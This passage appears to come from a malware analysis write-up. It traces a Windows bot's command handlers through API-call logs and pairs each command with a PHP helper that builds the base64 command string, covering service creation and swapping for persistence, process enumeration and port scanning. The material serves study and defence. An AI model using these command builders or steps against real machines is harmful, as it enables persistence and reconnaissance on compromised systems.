[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x0000008CACDF76D0
[STR]         -> "home"
[PAR] LPCSTR  lpDatabaseName  : 0x0000008CAED788F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0x8caed685ad]

[CNT] [377]
[PTP] [0x998] [0x6e0] [c:\windows\system32\rundll32.exe]
[API] <CreateServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager       : 0xace11e70 
[PAR] LPCWSTR   lpServiceName    : 0x0000008CACDFEAD0
[STR]           -> "evil"
[PAR] LPCWSTR   lpDisplayName    : 0x0000008CACDFEAD0
[STR]           -> "evil"
[PAR] DWORD     dwDesiredAccess  : 0xf01ff (SERVICE_ALL_ACCESS)
[PAR] DWORD     dwServiceType    : 0x10 (SERVICE_WIN32_OWN_PROCESS)
[PAR] DWORD     dwStartType      : 0x2 (SERVICE_AUTO_START)
[PAR] LPCWSTR   lpBinaryPathName : 0x0000008CACE11AB0
[STR]           -> "C:\Windows\evil.exe"
[RET] [0x8caed68631]
```

**III. Result**   

```html
[CNT] [379]
[PTP] [0x998] [0x6e0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000008CACDF3980
[STR]        -> "37FE"
[STR]           "11 home C:\Windows\evil.exe"
[PAR] DWORD  cbBinary   : 0x42
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000008CACE123E0
[PAR] DWORD* pcchString : 0x0000008CAF36EB3C
[RET] [0x8caed5e028]
```

<a id="createService"></a>
# createService  

```php
function createService($MachineName, $serviceName, $path)
{
	$cmd_id = "\xe9\x97 $MachineName $serviceName $path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [733]
[PTP] [0x8b4] [0x6d8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000F715726200
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ItH2SP8fZwzhxBSnGmBD8X4ndBskjeX8JLmLOBF6BYmAYj6XjJZ1YpqbTIGRGsqNWcUL/oTW"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000F71574B550
[PAR] DWORD   *pcbBinary : 0x000000F7175AEC5C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xf71750bea1]
```

**II. Execution**   

```html
[CNT] [745]
[PTP] [0x8b4] [0x6d8] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x000000F715751910
[STR]         -> "home"
[PAR] LPCSTR  lpDatabaseName  : 0x000000F7175288F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0xf71751cc29]

[CNT] [746]
[PTP] [0x8b4] [0x6d8] [c:\windows\system32\rundll32.exe]
[API] <CreateServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager       : 0x15751af0 
[PAR] LPCWSTR   lpServiceName    : 0x000000F715741510
[STR]           -> "evil2"
[PAR] LPCWSTR   lpDisplayName    : 0x000000F715741510
[STR]           -> "evil2"
[PAR] DWORD     dwDesiredAccess  : 0xf01ff (SERVICE_ALL_ACCESS)
[PAR] DWORD     dwServiceType    : 0x10 (SERVICE_WIN32_OWN_PROCESS)
[PAR] DWORD     dwStartType      : 0x2 (SERVICE_AUTO_START)
[PAR] LPCWSTR   lpBinaryPathName : 0x000000F715739EE0
[STR]           -> "C:\Windows\evil2.exe"
[RET] [0xf71751ccaf]
```

**III. Result**   

```html
[CNT] [765]
[PTP] [0x8b4] [0x6d8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000F715751820
[STR]        -> "E997"
[STR]           "11 evil2 home"
[PAR] DWORD  cbBinary   : 0x24
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000F715726200
[PAR] DWORD* pcchString : 0x000000F7175AEA2C
[RET] [0xf71750e028]
```

<a id="deleteService"></a>
# deleteService  

```php
function deleteService($MachineName, $serviceName)
{
	$cmd_id = "\x73\xfa $MachineName $serviceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x93c] [0xbc4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000E7B8384E80
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+d6T6SP8fZwzhxBSnGmBD8R9udygI3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000E7B838A260
[PAR] DWORD   *pcbBinary : 0x000000E7BA37EC3C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xe7ba2dbea1]
```

**II. Execution**   

```html
[CNT] [337]
[PTP] [0x93c] [0xbc4] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x000000E7B8392B80
[STR]         -> "home"
[PAR] LPCSTR  lpDatabaseName  : 0x000000E7BA2F88F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0xe7ba2ecf33]

[CNT] [338]
[PTP] [0x93c] [0xbc4] [c:\windows\system32\rundll32.exe]
[API] <OpenServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager      : 0xb839c760 
[PAR] LPCWSTR   lpServiceName   : 0x000000E7B8392BA0
[STR]           -> "evil"
[PAR] DWORD     dwDesiredAccess : 0x10000 (DELETE)
[RET] [0xe7ba2ecf60]

[CNT] [339]
[PTP] [0x93c] [0xbc4] [c:\windows\system32\rundll32.exe]
[API] <DeleteService> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService : 0xb839cac0
[RET] [0xe7ba2ecf75]
```

**III. Result**   

```html
[CNT] [357]
[PTP] [0x93c] [0xbc4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000E7B839C790
[STR]        -> "73FA"
[STR]           "11 evil home"
[PAR] DWORD  cbBinary   : 0x22
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000E7B8376660
[PAR] DWORD* pcchString : 0x000000E7BA37EA6C
[RET] [0xe7ba2de028]
```

<a id="changeServiceConfig"></a>
# changeServiceConfig  

```php
function changeServiceConfig($MachineName, $serviceName, $BinaryPathName)
{
	$cmd_id = "\x3e\x3b $MachineName $serviceName $BinaryPathName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [395]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000CF653C4290
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ROHmSP8fZwzhxBSnGmBD8XoJe2kzp/nUJ4PsJRd6L5C8YlGVj7g3d7OxT4jna7bHFtg="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000CF653D2060
[PAR] DWORD   *pcbBinary : 0x000000CF6724EB9C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0xcf671abea1]
```

**II. Execution**   

```html
[CNT] [407]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <OpenSCManagerA> in [ADVAPI32.dll] 
[PAR] LPCSTR  lpMachineName   : 0x000000CF653F3CC0
[STR]         -> "home"
[PAR] LPCSTR  lpDatabaseName  : 0x000000CF671C88F4
[STR]         -> "ServicesActive"
[PAR] DWORD   dwDesiredAccess : 0xf003f (SC_MANAGER_ALL_ACCESS)
[RET] [0xcf671bd231]

[CNT] [408]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <OpenServiceW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hSCManager      : 0x653f3ae0 
[PAR] LPCWSTR   lpServiceName   : 0x000000CF653DEA50
[STR]           -> "evil"
[PAR] DWORD     dwDesiredAccess : 0xf01ff (SERVICE_ALL_ACCESS)
[RET] [0xcf671bd260]

[CNT] [411]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <QueryServiceConfigW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE               hService        : 0x000000CF653F3840
[PAR] LPQUERY_SERVICE_CONFIGW lpServiceConfig : 0x000000CF653F2400
[PAR] DWORD                   cbBufSize       : 0xd8
[PAR] LPDWORD                 pcbBytesNeeded  : 0x000000CF6724EA6C
[RET] [0xcf671bd2c5]

[CNT] [412]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <ChangeServiceConfigW> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService           : 0x653f3840
[PAR] DWORD     dwServiceType      : 0xffffffff (SERVICE_NO_CHANGE)
[PAR] DWORD     dwStartType        : 0x3 (SERVICE_DEMAND_START)
[PAR] LPCWSTR   lpBinaryPathName   : 0x000000CF653F3B70
[STR]           -> "c:\Windows\toto.exe"
[PAR] LPCWSTR   lpServiceStartName : 0x0 (null)
[RET] [0xcf671bd33b]

[CNT] [413]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <StartServiceA> in [ADVAPI32.dll] 
[PAR] SC_HANDLE hService            : 0x000000CF653F3840
[PAR] DWORD     dwNumServiceArgs    : 0x0
[PAR] LPCTSTR*  lpServiceArgVectors : 0x0
[RET] [0xcf671bd351]
```

**III. Result**   

```html
[CNT] [423]
[PTP] [0x72c] [0x9f0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000CF653D2A60
[STR]        -> "3E3B"
[STR]           "CCCCCCC"
[STR]           "c:\Windows\toto.exe"
[PAR] DWORD  cbBinary   : 0x42
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000CF653F4C40
[PAR] DWORD* pcchString : 0x000000CF6724E95C
[RET] [0xcf671ae028]
```

<a id="GetProcessInfo"></a>
# GetProcessInfo  

```php
function GetProcessInfo($processName)
{
	$cmd_id = "\x62\xc6 $processName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000039450B2900
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+TfjMSMQANg/Z0G+yJFVm92kWXjNHwdzTJtM="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x00000039450B6A00
[PAR] DWORD   *pcbBinary : 0x000000394700E61C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x3946f6bea1]
```

**II. Execution**   

```html
[CNT] [369]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <RtlAdjustPrivilege> in [ntdll.dll] 
[PAR] ULONG    Privilege  : 0x14
[PAR] BOOLEAN  Enable     : 0x1
[PAR] BOOLEAN  Client     : 0x0
[PAR] PBOOLEAN WasEnabled : 0x000000394700DC0C
[RET] [0x3946f69a5c]

[CNT] [370]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <CreateToolhelp32Snapshot> in [KERNEL32.DLL] 
[PAR] DWORD dwFlags       : 0x2 ( TH32CS_SNAPPROCESS)
[PAR] DWORD th32ProcessID : 0x0
[RET] [0x3946f78807]

[ * ] [pid 0xae8][tid 0x2d8] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x000000394700E2F8
[FLD]                   -> th32ProcessID = 0x4
[FLD]                   -> szExeFile     = "System"
[RES] BOOL 0x1

[ * ] [pid 0xae8][tid 0x2d8] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x000000394700E2F8
[FLD]                   -> th32ProcessID = 0x118
[FLD]                   -> szExeFile     = "smss.exe"
[RES] BOOL 0x1

[...]

[ * ] [pid 0xae8][tid 0x2d8] c:\windows\system32\rundll32.exe
[API] <Process32NextW>
[PAR] LPPROCESSENTRY32W lppe : 0x000000394700E2F8
[FLD]                   -> th32ProcessID = 0x5a8
[FLD]                   -> szExeFile     = "explorer.exe"
[RES] BOOL 0x1

[CNT] [443]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcess> in [ntdll.dll] 
[PAR] PHANDLE             ProcessHandle    : 0x000000394700DC98
[PAR] ACCESS_MASK         DesiredAccess    : 0x410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
[PAR] POBJECT_ATTRIBUTES  ObjectAttributes : 0x000000394700DCB0
[PAR] PCLIENT_ID          ClientId         : 0x000000394700DCA0
[RET] [0x3946f84aab]

[CNT] [444]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[/!\] [ Attempt to bypass hooked API detected ! ]
[API] <NtOpenProcessToken> in [ntdll.dll] 
[PAR] HANDLE      ProcessHandle : 0x2f8
[PAR] ACCESS_MASK DesiredAccess : 0x8 (TOKEN_QUERY)
[PAR] PHANDLE     TokenHandle   : 0x000000394700DC78
[RET] [0x3946f84b2f]

[CNT] [446]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <GetTokenInformation> in [ADVAPI32.dll] 
[PAR] HANDLE                  TokenHandle            : 0x2fc
[PAR] TOKEN_INFORMATION_CLASS TokenInformationClass  : 0x1(TokenUser)
[PAR] LPVOID                  TokenInformation       : 0x00000039450B6040
[PAR] DWORD                   TokenInformationLength : 0x2c
[PAR] PDWORD                  ReturnLength           : 0x000000394700DC64
[RET] [0x3946f789f5]

[CNT] [447]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x00000039450B6050
[PAR] LPTSTR        lpName                  : 0x000000394700DCE0
[PAR] LPDWORD       cchName                 : 0x000000394700DC68
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000394700DEE8
[PAR] LPDWORD       cchReferencedDomainName : 0x000000394700DC68
[PAR] PSID_NAME_USE peUse                   : 0x000000394700DC6C
[RET] [0x3946f78a39]

[CNT] [448]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <IsWow64Process> in [KERNEL32.DLL] 
[PAR] HANDLE hProcess     : 0x2f8
[PAR] PBOOL  Wow64Process : 0x000000394700DC70
[RET] [0x3946f78a66]
```

**III. Result**   

```html
[CNT] [487]
[PTP] [0xae8] [0x2d8] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x00000039450C7D10
[STR]        -> "62C6"
[STR]           "1424 1448 x64 home\user explorer.exe"
[PAR] DWORD  cbBinary   : 0x54
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x00000039450AFF40
[PAR] DWORD* pcchString : 0x000000394700DB9C
[RET] [0x3946f6e028]
```

<a id="port_scan"></a>
# port_scan  

```php
// ex: port_scan("tiguanin.com", "8041 80 42");
function port_scan($hostname, $ports)
{
	$cmd_id = "\x91\xe5 $hostname $ports";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0x598] [0x9d0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x000000390F0F91C0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+f+7ASPofMhbfwBC+H1ob92p8DysipfrTC6r7NDwNIJSWYSGYweFDbLXL"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000000390F0E28B0
[PAR] DWORD   *pcbBinary : 0x0000003910FCE8BC
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x3910f2bea1]
```

**II. Execution**   

```html
[CNT] [358]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <inet_pton> in [ws2_32.dll] 
[PAR] INT   Family        : 0x2 (AF_INET) (IPv4)
[PAR] PCSTR pszAddrString : 0x000000390F0EC740
[STR]       -> "tiguanin.com"
[PAR] PVOID pAddrBuf      : 0x000000391151F134
[RET] [0x3910f36822]

[CNT] [359]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <gethostbyname> in [ws2_32.dll] 
[PAR] PCHAR name : 0x000000390F0EC740
[STR]       -> "tiguanin.com"
[RET] [0x3910f36835]

[CNT] [374]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x1 (SOCK_STREAM)
[PAR] int protocol       : 0x6 (IPPROTO_TCP)
[RET] [0x3910f3696a]

[CNT] [375]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <htons> in [ws2_32.dll] 
[PAR] u_short hostshort  : 8041 (0x1f69)
[RET] [0x3910f36986]

[CNT] [376]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <connect> in [ws2_32.dll] 
[PAR] SOCKET          s       : 0x2c8
[PAR] struct sockaddr *name   : 0x000000391151F150
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 26911 (Little endian : 8041)
[FLD]          -> sin_addr     : 169.254.143.46
[PAR] int             namelen : 0x10
[RET] [0x3910f3699d]

[CNT] [385]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <closesocket> in [ws2_32.dll] 
[PAR] SOCKET       s : 0x2c8
[RET] [0x3910f369fc]

[CNT] [387]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x1 (SOCK_STREAM)
[PAR] int protocol       : 0x6 (IPPROTO_TCP)
[RET] [0x3910f3696a]

[CNT] [388]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <htons> in [ws2_32.dll] 
[PAR] u_short hostshort  : 80 (0x50)
[RET] [0x3910f36986]

[CNT] [389]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <connect> in [ws2_32.dll] 
[PAR] SOCKET          s       : 0x2c8
[PAR] struct sockaddr *name   : 0x000000391151F150
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 20480 (Little endian : 80)
[FLD]          -> sin_addr     : 169.254.143.46
[PAR] int             namelen : 0x10
[RET] [0x3910f3699d]

[CNT] [398]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <closesocket> in [ws2_32.dll] 
[PAR] SOCKET       s : 0x2c8
[RET] [0x3910f369fc]

[CNT] [400]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <socket> in [ws2_32.dll] 
[PAR] int address_family : 0x2 (AF_INET) (IPv4)
[PAR] int type           : 0x1 (SOCK_STREAM)
[PAR] int protocol       : 0x6 (IPPROTO_TCP)
[RET] [0x3910f3696a]

[CNT] [401]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <htons> in [ws2_32.dll] 
[PAR] u_short hostshort  : 42 (0x2a)
[RET] [0x3910f36986]

[CNT] [402]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <connect> in [ws2_32.dll] 
[PAR] SOCKET          s       : 0x2c8
[PAR] struct sockaddr *name   : 0x000000391151F150
[FLD]          -> sin_family   : 2 (IPv4)
[FLD]          -> sin_port     : 10752 (Little endian : 42)
[FLD]          -> sin_addr     : 169.254.143.46
[PAR] int             namelen : 0x10
[RET] [0x3910f3699d]
```

**III. Result**   

```html
[CNT] [414]
[PTP] [0x598] [0x600] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000390F0E51B0
[STR]        -> "91E5"
[STR]           "11 tiguanin.com 169.254.143.46"
[STR]           "11 8041"
[STR]           "11 80"
[STR]           "12 42"
[PAR] DWORD  cbBinary   : 0x70
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000390F0F6FF0
[PAR] DWORD* pcchString : 0x000000391151F07C
[RET] [0x3910f2e028]
```
